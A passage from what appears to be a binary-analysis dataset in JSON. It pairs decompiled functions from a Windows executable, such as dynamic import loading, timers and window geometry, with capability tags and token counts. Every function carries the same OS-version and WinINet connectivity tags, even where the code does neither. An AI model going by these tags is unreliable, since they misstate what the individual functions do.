        "decompiled_code": "\nvoid fcn.004258e4(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uchar auStack16 [12];\n    \n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack16;\n    *0x463930 = *0x463930 + 1;\n    if ((*0x463930 == 0) && (*0x463934 != 0)) {\n        *0x463934 = 0;\n    }\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 118
    },
    "004259a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004259a8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x463968 != NULL) {\n        iVar2 = (**0x463968)(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x004259d4;\n        }\n    }\n    uVar1 = 0;\ncode_r0x004259d4:\n    return -uVar1;\n}\n",
        "token_count": 149
    },
    "004259dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004259dc(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x46396c != NULL) {\n        iVar2 = (**0x46396c)(arg_8h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x004259fc;\n        }\n    }\n    uVar1 = 0;\ncode_r0x004259fc:\n    return -uVar1;\n}\n",
        "token_count": 119
    },
    "00425e6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00425e6c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = 0x425e79;\n    fcn.00425e24();\n    uStack12 = 0x426023;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    if (0 < *0x463a3c) {\n        *0x463a3c = *0x463a3c + -1;\n    }\n    puStack8 = &stack0xfffffffc;\n    if ((*0x463a38 != 0) && (puStack8 = &stack0xfffffffc,  *0x463a3c == 0)) {\n        iStack20 = *0x463a38;\n        puStack8 = &stack0xfffffffc;\n        sub.kernel32.dll_FreeLibrary_1();\n        *0x463a38 = 0;\n        *0x463978 = 0;\n        *0x46397c = 0;\n        *0x463980 = 0;\n        *0x463984 = 0;\n        *0x463988 = 0;\n        *0x46398c = 0;\n        *0x463990 = 0;\n        *0x463994 = 0;\n        *0x463998 = 0;\n        *0x46399c = 0;\n        *0x4639a0 = 0;\n        *0x4639a4 = 0;\n        *0x4639a8 = 0;\n        *0x4639ac = 0;\n        *0x4639b0 = 0;\n        *0x4639b4 = 0;\n        *0x4639b8 = 0;\n        *0x4639bc = 0;\n        *0x4639c0 = 0;\n        *0x4639c4 = 0;\n        *0x4639c8 = 0;\n        *0x4639cc = 0;\n        *0x4639d0 = 0;\n        *0x4639d4 = 0;\n        *0x4639d8 = 0;\n        *0x4639dc = 0;\n        *0x4639e0 = 0;\n        *0x4639e4 = 0;\n        *0x4639e8 = 0;\n        *0x4639ec = 0;\n        *0x4639f0 = 0;\n        *0x4639f4 = 0;\n        *0x4639f8 = 0;\n        *0x4639fc = 0;\n        *0x463a00 = 0;\n        *0x463a04 = 0;\n        *0x463a08 = 0;\n        *0x463a0c = 0;\n        *0x463a10 = 0;\n        *0x463a14 = 0;\n        *0x463a18 = 0;\n        *0x463a1c = 0;\n        *0x463a20 = 0;\n        *0x463a24 = 0;\n        *0x463a28 = 0;\n        *0x463a2c = 0;\n        *0x463a30 = 0;\n    }\n    *in_FS_OFFSET = iStack20;\n    uStack12 = 0x42602a;\n    iStack16 = 0x426022;\n    fcn.00425e2c();\n    return;\n}\n",
        "token_count": 815
    },
    "0042602c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.0042602c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffe6c;\n    int32_t iStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_1h;\n    \n    puStack16 = 0x426040;\n    fcn.00425e24();\n    uStack20 = 0x4263df;\n    iStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    *0x463a3c = *0x463a3c + 1;\n    puStack16 = &fcn.0042602c::var_1h + 1;\n    if (*0x463a38 == 0) {\n        puStack16 = &fcn.0042602c::var_1h + 1;\n        *0x463a38 = sub.kernel32.dll_LoadLibraryA(0x4263f0);\n        if (*0x463a38 != 0) {\n            *0x463978 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4263fc);\n            *0x46397c = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x42640c);\n            *0x463980 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x42641c);\n            *0x463984 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426430);\n            *0x463988 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426440);\n            *0x46398c = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426440);\n            *0x463990 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426460);\n            *0x463994 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426474);\n            *0x463998 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426488);\n            *0x46399c = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x42649c);\n            *0x4639a0 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4264b8);\n            *0x4639a4 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4264d0);\n            *0x4639a8 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4264e0);\n            *0x4639ac = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4264f0);\n            *0x4639b0 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426504);\n            *0x4639b4 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x42652c);\n            *0x4639b8 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x42653c);\n            *0x4639bc = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x42654c);\n            *0x4639c0 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x42655c);\n            *0x4639c4 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x42656c);\n            *0x4639c8 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426578);\n            *0x4639cc = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x42658c);\n            *0x4639d0 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4265a0);\n            *0x4639d4 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4265b0);\n            *0x4639d8 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4265c0);\n            *0x4639dc = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4265d0);\n            *0x4639e0 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4265e0);\n            *0x4639e4 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4265f8);\n            *0x4639e8 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426608);\n            *0x4639ec = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x42661c);\n            *0x4639f0 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426630);\n            *0x4639f4 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426648);\n            *0x4639f8 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426658);\n            *0x4639fc = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426668);\n            *0x463a00 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426678);\n            *0x463a04 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x42668c);\n            *0x463a08 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x42669c);\n            *0x463a0c = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4266ac);\n            *0x463a10 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4266b8);\n            *0x463a14 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4266c8);\n            *0x463a18 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x4266e4);\n            *0x463a1c = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426700);\n            *0x463a20 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426718);\n            *0x463a24 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426730);\n            *0x463a28 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426744);\n            *0x463a2c = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426764);\n            in_stack_fffffe6c = *0x463a38;\n            *0x463a30 = sub.kernel32.dll_GetProcAddress_1(*0x463a38, 0x426780);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffe6c;\n    fcn.00425e2c(0x4263e6);\n    return;\n}\n",
        "token_count": 1716
    },
    "00426790": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00426790(void)\n\n{\n    int32_t iVar1;\n    \n    if (((*0x463a38 != 0) && (iVar1 = (**0x463a0c)(),  iVar1 != 0)) && (iVar1 = (**0x463a08)(),  iVar1 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 87
    },
    "004267b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004267b8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x426800;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x463a34 = *0x463a34 + 1;\n    if (*0x463a34 == 0) {\n        while (0 < *0x463a3c) {\n            fcn.00425e6c();\n        }\n        fcn.00403258();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 163
    },
    "00427494": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00427494(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x4a) != 0) {\n        (**(in_EAX + 0x48))();\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "004274a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004274a8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x52) != 0) {\n        (**(in_EAX + 0x50))();\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "00427740": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00427740(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x8a) != 0) {\n        (**(in_EAX + 0x88))();\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "00427b7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00427bcf)\n// WARNING: Removing unreachable block (ram,0x00427bdc)\n// WARNING: Removing unreachable block (ram,0x00427be9)\n// WARNING: Removing unreachable block (ram,0x00427bf1)\n// WARNING: Removing unreachable block (ram,0x00427bfe)\n// WARNING: Removing unreachable block (ram,0x00427c07)\n// WARNING: Removing unreachable block (ram,0x00427c10)\n// WARNING: Removing unreachable block (ram,0x00427c1e)\n\nvoid __cdecl fcn.00427b7c(int32_t arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x427c61;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.00427b34(arg_8h);\n    fcn.00427b34(arg_8h);\n    (**(**(*(arg_8h + -8) + 0x7c) + 0x38))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x427c68;\n    uStack24 = 0x427c60;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 335
    },
    "00427d88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00427d88(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack272 [264];\n    \n    if ((**0x461fc0 == '\\0') || (*(in_EAX + 0x3c) == 0)) {\n        fcn.00403ffc();\n    }\n    else {\n        uVar1 = sub.user32.dll_GetParent(*(in_EAX + 0x3c), 0x465, 0x105, auStack272);\n        sub.user32.dll_SendMessageA(uVar1);\n        fcn.004087c8();\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "00428074": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00428074(void)\n\n{\n    uchar *puVar1;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x4280c6;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x463a68 = *0x463a68 + 1;\n    if (*0x463a68 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x461728 != 0) {\n            uStack20 = *0x461728;\n            sub.kernel32.dll_GlobalDeleteAtom();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00404a30();\n    }\n    *in_FS_OFFSET = uStack20;\n    return;\n}\n",
        "token_count": 221
    },
    "00429b34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00429b34(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00440e9c();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x429bc8;\n    iVar1 = fcn.0041f838();\n    *(in_EAX + 0x168) = iVar1;\n    *(iVar1 + 0x14) = in_EAX;\n    *(iVar1 + 0x10) = fcn.00429f78;\n    *(iVar1 + 0x24) = in_EAX;\n    uVar2 = fcn.0040346c();\n    *(iVar1 + 0x20) = uVar2;\n    fcn.00438d0c();\n    fcn.00438ce8();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 325
    },
    "00429c18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429c18(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    double dVar7;\n    \n    iVar1 = fcn.0041fe50();\n    iVar2 = fcn.0041fe68();\n    iVar3 = fcn.00438f30();\n    iVar4 = fcn.00438f74();\n    if ((((*(in_EAX + 0x178) != '\\0') ||\n         ((iVar6 = iVar1,  iVar5 = iVar2,  *(in_EAX + 0x17d) != '\\0' && ((iVar3 < iVar1 || (iVar4 < iVar2)))))) &&\n        (iVar6 = iVar3,  iVar5 = iVar4,  *(in_EAX + 0x17d) != '\\0')) && ((0 < iVar1 && (0 < iVar2)))) {\n        dVar7 = iVar1 / iVar2;\n        if (iVar2 < iVar1) {\n            iVar5 = fcn.00402a68(iVar3, iVar4, dVar7);\n            if (iVar4 < iVar5) {\n                iVar1 = iVar4;\n                iVar6 = fcn.00402a68(iVar3, iVar4, dVar7);\n                iVar5 = iVar4;\n                iVar4 = iVar1;\n            }\n        }\n        else {\n            iVar6 = fcn.00402a68(iVar3, iVar4, dVar7);\n            if (iVar3 < iVar6) {\n                iVar1 = iVar3;\n                iVar5 = fcn.00402a68(iVar3, iVar4, dVar7);\n                iVar6 = iVar3;\n                iVar3 = iVar1;\n            }\n        }\n    }\n    *param_2 = 0;\n    param_2[1] = 0;\n    param_2[2] = iVar6;\n    param_2[3] = iVar5;\n    if (*(in_EAX + 0x179) != '\\0') {\n        iVar1 = iVar4 - iVar5 >> 1;\n        if (iVar1 < 0) {\n            iVar1 = iVar1 + ((iVar4 - iVar5 & 1U) != 0);\n        }\n        iVar4 = iVar3 - iVar6 >> 1;\n        if (iVar4 < 0) {\n            iVar4 = iVar4 + ((iVar3 - iVar6 & 1U) != 0);\n        }\n        sub.user32.dll_OffsetRect(param_2, iVar4, iVar1);\n    }\n    return;\n}\n",
        "token_count": 599
    },
    "00429e9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00429e9c(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    uint var_1h;\n    \n    piVar2 = in_EAX;\n    if ((*(in_EAX + 0x17a) & arg_10h) != 0) {\n        cVar1 = fcn.00429e04();\n        if (cVar1 == '\\0') {\n            piVar2 = (**(*in_EAX + 0x8c))();\n        }\n        else {\n            piVar2 = (**(*in_EAX + 0x88))();\n        }\n    }\n    if (*(in_EAX + 0x172) != 0) {\n        (*in_EAX[0x5c])(arg_8h, arg_ch, arg_10h, piVar2 & 0xffffff00 | arg_14h & 0xff);\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "00429f78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00429f78(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    if (*(in_EAX + 0x17) != '\\0') {\n        iVar3 = fcn.0041fe50();\n        if (0 < iVar3) {\n            iVar3 = fcn.0041fe68();\n            if (0 < iVar3) {\n                uVar4 = fcn.0041fe50();\n                uVar4 = fcn.0041fe68(uVar4);\n                (**(*in_EAX + 0x84))(uVar4);\n            }\n        }\n    }\n    piVar1 = *(in_EAX[0x5a] + 0xc);\n    if (piVar1 == NULL) {\n        in_EAX[0x14] = ~*0x42a09c & in_EAX[0x14];\n    }\n    else {\n        cVar2 = fcn.004033e4();\n        if (cVar2 == '\\0') {\n            cVar2 = fcn.004033e4();\n            if (cVar2 == '\\0') {\n                (**(*piVar1 + 0x3c))();\n            }\n        }\n        fcn.00429c18();\n        cVar2 = (**(*piVar1 + 0x28))();\n        if ((((cVar2 == '\\0') && (iStack24 < 1)) && (iStack20 < 1)) &&\n           ((in_EAX[0x12] <= iStack16 && (in_EAX[0x13] <= iStack12)))) {\n            in_EAX[0x14] = *0x42a09c | in_EAX[0x14];\n        }\n        else {\n            in_EAX[0x14] = ~*0x42a09c & in_EAX[0x14];\n        }\n        cVar2 = fcn.00429e04();\n        if ((cVar2 != '\\0') && (*(in_EAX + 0x5f) != '\\0')) {\n            (**(*in_EAX + 0x88))();\n        }\n    }\n    if (*(in_EAX + 0x5f) == '\\0') {\n        (**(*in_EAX + 0x7c))();\n    }\n    return;\n}\n",
        "token_count": 560
    },
    "0042a204": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042a204(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffcc;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x42a283;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    sub.user32.dll_KillTimer(*(in_EAX + 0x34), 1);\n    if (((*(in_EAX + 0x30) != 0) && (*(in_EAX + 0x40) != '\\0')) && (*(in_EAX + 0x3a) != 0)) {\n        in_stack_ffffffcc = *(in_EAX + 0x34);\n        iVar1 = sub.user32.dll_SetTimer(in_stack_ffffffcc, 1, *(in_EAX + 0x30), 0);\n        if (iVar1 == 0) {\n            fcn.00405b0c();\n            fcn.0040b538();\n            fcn.004039e4();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.00403fa8(0x42a28a);\n    return;\n}\n",
        "token_count": 306
    },
    "0042a450": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a450(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x42a540;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    if (*(in_EAX + 0x21d) == '\\0') {\n        fcn.0043952c();\n        iVar2 = in_EAX[0x86];\n        if (*(in_EAX + 0x211) != '\\0') {\n            iVar2 = iVar2 + in_EAX[0x85];\n        }\n        if (*(in_EAX + 0x212) != '\\0') {\n            iVar2 = iVar2 + in_EAX[0x85];\n        }\n        if (0 < iVar2) {\n            var_8h = in_EAX[0x12];\n            var_4h = in_EAX[0x13];\n            if (*(*(param_2 + 8) + 0x10) != var_8h) {\n                var_ch = 0;\n                var_10h = (var_8h - iVar2) + -1;\n                uStack60 = fcn.0043fd08(&var_10h, 0xffffffff);\n                sub.user32.dll_InvalidateRect();\n            }\n            if (*(*(param_2 + 8) + 0x14) != var_4h) {\n                var_10h = 0;\n                var_ch = (var_4h - iVar2) + -1;\n                uVar1 = fcn.0043fd08(&var_10h, 0xffffffff);\n                sub.user32.dll_InvalidateRect(uVar1);\n            }\n        }\n    }\n    else {\n        uStack44 = 0x42a540;\n        puStack40 = &stack0xfffffffc;\n        (**(*in_EAX + 0x7c))();\n    }\n    fcn.0043e1e4();\n    *in_FS_OFFSET = uStack60;\n    fcn.00403fa8(0x42a547);\n    return;\n}\n",
        "token_count": 563
    },
    "0042a7f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a7f4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    if (*(in_EAX + 0x17) == '\\0') {\n        puStack44 = 0x42a927;\n        fcn.0043e99c();\n    }\n    else {\n        *(in_EAX + 0x84) = 1;\n        uStack48 = 0x42a915;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        iVar2 = *(param_2 + 4);\n        cVar1 = *(in_EAX + 0x5b);\n        if (cVar1 == '\\x01') {\n            puVar3 = &stack0xfffffffc;\n            if (in_EAX[0x13] == 0) {\n                fcn.00438d0c();\n                puVar3 = puStack44;\n            }\n        }\n        else if (cVar1 == '\\x02') {\n            puVar3 = &stack0xfffffffc;\n            if (in_EAX[0x13] == 0) {\n                puStack44 = &stack0xfffffffc;\n                (**(*in_EAX + 0x84))(*(iVar2 + 0x50) - *(iVar2 + 0x48), in_EAX[0x12]);\n                puVar3 = puStack44;\n            }\n        }\n        else if (cVar1 == '\\x03') {\n            puVar3 = &stack0xfffffffc;\n            if (in_EAX[0x12] == 0) {\n                puStack44 = &stack0xfffffffc;\n                fcn.00438ce8();\n                puVar3 = puStack44;\n            }\n        }\n        else {\n            puVar3 = &stack0xfffffffc;\n            if ((cVar1 == '\\x04') && (puVar3 = &stack0xfffffffc,  in_EAX[0x12] == 0)) {\n                puStack44 = &stack0xfffffffc;\n                (**(*in_EAX + 0x84))(in_EAX[0x13], *(iVar2 + 0x4c) - *(iVar2 + 0x44));\n                puVar3 = puStack44;\n            }\n        }\n        puStack44 = puVar3;\n        fcn.0043e99c();\n        fcn.00403a90();\n    }\n    return;\n}\n",
        "token_count": 641
    },
    "0042abbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
